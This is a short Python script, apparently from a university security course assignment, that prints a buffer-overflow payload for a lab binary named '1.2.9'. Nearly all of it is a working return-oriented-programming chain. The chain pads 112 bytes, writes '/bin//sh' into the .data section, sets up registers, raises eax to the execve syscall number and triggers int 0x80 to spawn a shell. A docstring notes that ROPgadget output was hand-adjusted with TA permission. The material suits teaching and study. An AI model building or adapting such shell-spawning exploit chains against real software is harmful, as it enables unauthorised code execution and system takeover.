from struct import pack
"""
We use ROPgadget to list all the rops in 1.2.9, we asked the TA for permission to use this tool during office hour on Monday, Feb. 12.
The generated rop code of the tool does not work out of the box, we have to make changes to second half of the rop code by increasing eax 11 times; pop edi, and compensate for esp
ROPgadget --binary ./1.2.9 --ropchain
"""

p = ''
padding = '\x90' * 112
p += padding
p += pack('<I', 0x0805733a)  # pop edx; ret
p += pack('<I', 0x080ef060)  # @ .data
p += pack('<I', 0x080c2356)  # pop eax ; ret
p += '/bin'
p += pack('<I', 0x0808e97d)  # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0805733a)  # pop edx ; ret
p += pack('<I', 0x080ef064)  # @ .data + 4
p += pack('<I', 0x080c2356)  # pop eax ; ret
p += '//sh'
p += pack('<I', 0x0808e97d)  # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0805733a)  # pop edx ; ret
p += pack('<I', 0x080ef068)  # @ .data + 8
p += pack('<I', 0x08051750)  # xor eax, eax ; ret
p += pack('<I', 0x0808e97d)  # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481ec)  # pop ebx ; ret
p += pack('<I', 0x080ef060)  # @ .data
p += pack('<I', 0x080e3d46)  # pop ecx ; ret
p += pack('<I', 0x080ef068)  # @ .data + 8
p += pack('<I', 0x0805733a)  # pop edx ; ret
p += pack('<I', 0x080ef068)  # @ .data + 8
p += pack('<I', 0x08051750)  # xor eax, eax ; ret

# Increase eax 11 times
p += pack('<I', 0x8050bbc)  # inc eax; pop edi; ret
p += pack('<I', 0x08056ca2)  # dec esp; ret
p += pack('<I', 0x8050bbc)  # inc eax; pop edi; ret
p += pack('<I', 0x08056ca2)  # dec esp; ret
p += pack('<I', 0x8050bbc)  # inc eax; pop edi; ret
p += pack('<I', 0x08056ca2)  # dec esp; ret
p += pack('<I', 0x8050bbc)  # inc eax; pop edi; ret
p += pack('<I', 0x08056ca2)  # dec esp; ret
p += pack('<I', 0x8050bbc)  # inc eax; pop edi; ret
p += pack('<I', 0x08056ca2)  # dec esp; ret
p += pack('<I', 0x8050bbc)  # inc eax; pop edi; ret
p += pack('<I', 0x08056ca2)  # dec esp; ret
p += pack('<I', 0x8050bbc)  # inc eax; pop edi; ret
p += pack('<I', 0x08056ca2)  # dec esp; ret
p += pack('<I', 0x8050bbc)  # inc eax; pop edi; ret
p += pack('<I', 0x08056ca2)  # dec esp; ret
p += pack('<I', 0x8050bbc)  # inc eax; pop edi; ret
p += pack('<I', 0x08056ca2)  # dec esp; ret
p += pack('<I', 0x8050bbc)  # inc eax; pop edi; ret
p += pack('<I', 0x08056ca2)  # dec esp; ret
p += pack('<I', 0x8050bbc)  # inc eax; pop edi; ret
p += pack('<I', 0x08056ca2)  # dec esp; ret
p += pack('<I', 0x080494f9)  # int 0x80
print p
